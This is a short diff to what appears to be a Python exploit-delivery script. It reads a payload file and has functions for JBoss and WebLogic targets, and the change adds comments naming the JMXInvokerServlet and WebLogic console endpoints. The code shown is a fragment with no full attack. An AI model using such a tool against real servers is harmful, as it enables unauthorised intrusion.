@@ -19,6 +19,7 @@ args = parser.parse_args()
 payloadObj = open(args.payload,'rb').read()
 
 def jboss():
+	# http://IP:80/invoker/JMXInvokerServlet
 	http = 'http://'
 	ishttp = args.host.find(http)
 	if ishttp<0:
@@ -30,6 +31,7 @@ def jboss():
 	
 
 def weblogic():
+	# http://IP:7001/console/login/LoginForm.jsp
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 	server_address = (args.host, int(args.port))
